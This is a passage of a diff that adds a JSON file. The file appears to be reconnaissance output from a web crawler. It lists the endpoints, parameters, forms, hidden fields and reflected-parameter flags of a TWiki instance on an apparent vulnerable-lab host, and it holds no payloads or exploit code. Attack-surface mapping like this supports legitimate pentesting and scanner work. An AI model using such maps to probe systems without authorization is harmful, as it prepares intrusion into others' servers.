+          "examples": [
+            "Main.WebHome"
+          ],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "topicparent"
+      ],
+      "forms": [],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> <head> <ti",
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/preview/TWiki/TWikiForms",
+      "method": "POST",
+      "params": [
+        {
+          "name": "text",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "formtemplate",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "topicparent",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "cmd",
+          "location": "body",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        }
+      ],
+      "status_codes": [],
+      "content_type": null,
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/preview/TWiki/TWikiForms",
+          "method": "POST",
+          "fields": [
+            "text",
+            "formtemplate",
+            "topicparent",
+            "cmd"
+          ],
+          "field_types": {
+            "text": "text",
+            "formtemplate": "hidden",
+            "topicparent": "hidden",
+            "cmd": "hidden"
+          },
+          "hidden_values": {
+            "formtemplate": "",
+            "topicparent": "Main.WebHome",
+            "cmd": ""
+          },
+          "page_url": "https://server.vulnapp.id/twiki/bin/edit/TWiki/TWikiForms?topicparent=Main.WebHome",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "form",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/search/Know/",
+      "method": "GET",
+      "params": [
+        {
+          "name": "scope",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "web",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "bookview",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "search",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        },
+        {
+          "name": "order",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "reverse",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "casesensitive",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "regex",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "nosearch",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "nosummary",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "nototal",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "showlock",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "limit",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        }
+      ],
+      "status_codes": [],
+      "content_type": null,
+      "auth_required": null,
+      "reflected_params": [
+        "search"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/search/Know/",
+          "method": "GET",
+          "fields": [
+            "scope",
+            "web",
+            "scope",
+            "bookview",
+            "search"
+          ],
+          "field_types": {
+            "scope": "radio",
+            "web": "checkbox",
+            "bookview": "checkbox",
+            "search": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/Know/WebSearch",
+          "has_password_field": false,
+          "likely_login": false
+        },
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/search/Know/",
+          "method": "GET",
+          "fields": [
+            "scope",
+            "web",
+            "scope",
+            "order",
+            "reverse",
+            "search",
+            "casesensitive",
+            "regex",
+            "nosearch",
+            "nosummary",
+            "nototal",
+            "bookview",
+            "showlock",
+            "limit"
+          ],
+          "field_types": {
+            "scope": "radio",
+            "web": "text",
+            "order": "text",
+            "reverse": "checkbox",
+            "search": "text",
+            "casesensitive": "checkbox",
+            "regex": "checkbox",
+            "nosearch": "checkbox",
+            "nosummary": "checkbox",
+            "nototal": "checkbox",
+            "bookview": "checkbox",
+            "showlock": "checkbox",
+            "limit": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/Know/WebSearch",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "form",
+      "response_snippet": null,
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/search/Know/SearchResult",
+      "method": "GET",
+      "params": [
+        {
+          "name": "search",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [],
+      "content_type": null,
+      "auth_required": null,
+      "reflected_params": [
+        "search"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/search/Know/SearchResult",
+          "method": "GET",
+          "fields": [
+            "search"
+          ],
+          "field_types": {
+            "search": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/Know/WebHome",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "form",
+      "response_snippet": null,
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/search/Main/",
+      "method": "GET",
+      "params": [
+        {
+          "name": "scope",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "web",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "bookview",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "search",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        },
+        {
+          "name": "order",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "reverse",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "casesensitive",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "regex",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "nosearch",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "nosummary",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "nototal",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "showlock",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "limit",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        }
+      ],
+      "status_codes": [],
+      "content_type": null,
+      "auth_required": null,
+      "reflected_params": [
+        "search"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/search/Main/",
+          "method": "GET",
+          "fields": [
+            "scope",
+            "web",
+            "scope",
+            "bookview",
+            "search"
+          ],
+          "field_types": {
+            "scope": "radio",
+            "web": "checkbox",
+            "bookview": "checkbox",
+            "search": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/Main/WebSearch",
+          "has_password_field": false,
+          "likely_login": false
+        },
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/search/Main/",
+          "method": "GET",
+          "fields": [
+            "scope",
+            "web",
+            "scope",
+            "order",
+            "reverse",
+            "search",
+            "casesensitive",
+            "regex",
+            "nosearch",
+            "nosummary",
+            "nototal",
+            "bookview",
+            "showlock",
+            "limit"
+          ],
+          "field_types": {
+            "scope": "radio",
+            "web": "text",
+            "order": "text",
+            "reverse": "checkbox",
+            "search": "text",
+            "casesensitive": "checkbox",
+            "regex": "checkbox",
+            "nosearch": "checkbox",
+            "nosummary": "checkbox",
+            "nototal": "checkbox",
+            "bookview": "checkbox",
+            "showlock": "checkbox",
+            "limit": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/Main/WebSearch",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "form",
+      "response_snippet": null,
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/search/Main/SearchResult",
+      "method": "GET",
+      "params": [
+        {
+          "name": "search",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [],
+      "content_type": null,
+      "auth_required": null,
+      "reflected_params": [
+        "search"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/search/Main/SearchResult",
+          "method": "GET",
+          "fields": [
+            "search"
+          ],
+          "field_types": {
+            "search": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/Main/WebHome",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "form",
+      "response_snippet": null,
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/search/Sandbox/",
+      "method": "GET",
+      "params": [
+        {
+          "name": "scope",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "web",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "bookview",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "search",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "order",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "reverse",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "casesensitive",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "regex",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "nosearch",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "nosummary",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "nototal",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "showlock",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "limit",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        }
+      ],
+      "status_codes": [],
+      "content_type": null,
+      "auth_required": null,
+      "reflected_params": [],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/search/Sandbox/",
+          "method": "GET",
+          "fields": [
+            "scope",
+            "web",
+            "scope",
+            "bookview",
+            "search"
+          ],
+          "field_types": {
+            "scope": "radio",
+            "web": "checkbox",
+            "bookview": "checkbox",
+            "search": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/Sandbox/WebSearch",
+          "has_password_field": false,
+          "likely_login": false
+        },
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/search/Sandbox/",
+          "method": "GET",
+          "fields": [
+            "scope",
+            "web",
+            "scope",
+            "order",
+            "reverse",
+            "search",
+            "casesensitive",
+            "regex",
+            "nosearch",
+            "nosummary",
+            "nototal",
+            "bookview",
+            "showlock",
+            "limit"
+          ],
+          "field_types": {
+            "scope": "radio",
+            "web": "text",
+            "order": "text",
+            "reverse": "checkbox",
+            "search": "text",
+            "casesensitive": "checkbox",
+            "regex": "checkbox",
+            "nosearch": "checkbox",
+            "nosummary": "checkbox",
+            "nototal": "checkbox",
+            "bookview": "checkbox",
+            "showlock": "checkbox",
+            "limit": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/Sandbox/WebSearch",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "form",
+      "response_snippet": null,
+      "notes": null
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/search/Sandbox/SearchResult",
+      "method": "GET",
+      "params": [
+        {
+          "name": "search",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [],
+      "content_type": null,
+      "auth_required": null,
+      "reflected_params": [
+        "search"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/search/Sandbox/SearchResult",
+          "method": "GET",
+          "fields": [
+            "search"
+          ],
+          "field_types": {
+            "search": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/Sandbox/WebHome",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "form",
+      "response_snippet": null,
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/search/TWiki/",
+      "method": "GET",
+      "params": [
+        {
+          "name": "search",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        },
+        {
+          "name": "scope",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "web",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "bookview",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "order",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "reverse",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "casesensitive",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "regex",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "nosearch",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "nosummary",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "nototal",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "showlock",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        },
+        {
+          "name": "limit",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": false,
+          "notes": null
+        }
+      ],
+      "status_codes": [],
+      "content_type": null,
+      "auth_required": null,
+      "reflected_params": [
+        "search"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/search/TWiki/",
+          "method": "GET",
+          "fields": [
+            "search"
+          ],
+          "field_types": {
+            "search": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/TWiki/WebHome",
+          "has_password_field": false,
+          "likely_login": false
+        },
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/search/TWiki/",
+          "method": "GET",
+          "fields": [
+            "scope",
+            "web",
+            "scope",
+            "bookview",
+            "search"
+          ],
+          "field_types": {
+            "scope": "radio",
+            "web": "checkbox",
+            "bookview": "checkbox",
+            "search": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/TWiki/WebSearch",
+          "has_password_field": false,
+          "likely_login": false
+        },
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/search/TWiki/",
+          "method": "GET",
+          "fields": [
+            "scope",
+            "web",
+            "scope",
+            "order",
+            "reverse",
+            "search",
+            "casesensitive",
+            "regex",
+            "nosearch",
+            "nosummary",
+            "nototal",
+            "bookview",
+            "showlock",
+            "limit"
+          ],
+          "field_types": {
+            "scope": "radio",
+            "web": "text",
+            "order": "text",
+            "reverse": "checkbox",
+            "search": "text",
+            "casesensitive": "checkbox",
+            "regex": "checkbox",
+            "nosearch": "checkbox",
+            "nosummary": "checkbox",
+            "nototal": "checkbox",
+            "bookview": "checkbox",
+            "showlock": "checkbox",
+            "limit": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/TWiki/WebSearch",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "form",
+      "response_snippet": null,
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/search/TWiki/SearchResult",
+      "method": "GET",
+      "params": [
+        {
+          "name": "search",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [],
+      "content_type": null,
+      "auth_required": null,
+      "reflected_params": [
+        "search"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/search/TWiki/SearchResult",
+          "method": "GET",
+          "fields": [
+            "search"
+          ],
+          "field_types": {
+            "search": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/TWiki/WebHome",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "form",
+      "response_snippet": null,
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/view/Know/WebChanges",
+      "method": "GET",
+      "params": [
+        {
+          "name": "topic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "topic"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/view/Know/WebChanges",
+          "method": "GET",
+          "fields": [
+            "topic"
+          ],
+          "field_types": {
+            "topic": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/Know/WebChanges",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> <head> <ti",
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/view/Know/WebHome",
+      "method": "GET",
+      "params": [
+        {
+          "name": "topic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "topic"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/view/Know/WebHome",
+          "method": "GET",
+          "fields": [
+            "topic"
+          ],
+          "field_types": {
+            "topic": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/Know/WebHome",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> <head> <ti",
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/view/Know/WebPreferences",
+      "method": "GET",
+      "params": [
+        {
+          "name": "topic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "topic"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/view/Know/WebPreferences",
+          "method": "GET",
+          "fields": [
+            "topic"
+          ],
+          "field_types": {
+            "topic": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/Know/WebPreferences",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> <head> <ti",
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/view/Know/WebSearch",
+      "method": "GET",
+      "params": [
+        {
+          "name": "topic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "topic"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/view/Know/WebSearch",
+          "method": "GET",
+          "fields": [
+            "topic"
+          ],
+          "field_types": {
+            "topic": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/Know/WebSearch",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> <head> <ti",
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/view/Main/OfficeLocations",
+      "method": "GET",
+      "params": [
+        {
+          "name": "topic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "topic"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/view/Main/OfficeLocations",
+          "method": "GET",
+          "fields": [
+            "topic"
+          ],
+          "field_types": {
+            "topic": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/Main/OfficeLocations",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> <head> <ti",
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/view/Main/TWikiGroups",
+      "method": "GET",
+      "params": [
+        {
+          "name": "topic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "topic"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/view/Main/TWikiGroups",
+          "method": "GET",
+          "fields": [
+            "topic"
+          ],
+          "field_types": {
+            "topic": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/Main/TWikiGroups",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> <head> <ti",
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/view/Main/TWikiUsers",
+      "method": "GET",
+      "params": [
+        {
+          "name": "topic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "topic"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/view/Main/TWikiUsers",
+          "method": "GET",
+          "fields": [
+            "topic"
+          ],
+          "field_types": {
+            "topic": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/Main/TWikiUsers",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> <head> <ti",
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/view/Main/WebChanges",
+      "method": "GET",
+      "params": [
+        {
+          "name": "topic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "topic"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/view/Main/WebChanges",
+          "method": "GET",
+          "fields": [
+            "topic"
+          ],
+          "field_types": {
+            "topic": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/Main/WebChanges",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> <head> <ti",
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/view/Main/WebHome",
+      "method": "GET",
+      "params": [
+        {
+          "name": "topic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "topic"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/view/Main/WebHome",
+          "method": "GET",
+          "fields": [
+            "topic"
+          ],
+          "field_types": {
+            "topic": "text"
+          },
+          "hidden_values": {},
+          "page_url": "https://server.vulnapp.id/twiki/bin/view/Main/WebHome",
+          "has_password_field": false,
+          "likely_login": false
+        }
+      ],
+      "discovered_via": "link",
+      "response_snippet": "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"> <head> <ti",
+      "notes": "reflection=encoded"
+    },
+    {
+      "url": "https://server.vulnapp.id/twiki/bin/view/Main/WebIndex",
+      "method": "GET",
+      "params": [
+        {
+          "name": "topic",
+          "location": "query",
+          "type_hint": "string",
+          "examples": [],
+          "reflected": true,
+          "notes": null
+        }
+      ],
+      "status_codes": [
+        200
+      ],
+      "content_type": "text/html",
+      "auth_required": null,
+      "reflected_params": [
+        "topic"
+      ],
+      "forms": [
+        {
+          "action": "https://server.vulnapp.id/twiki/bin/view/Main/WebIndex",
+          "method": "GET",
+          "fields": [
+            "topic"
+          ],
+          "field_types": {
+            "topic": "text"
+          },
+          "hidden_values": {},
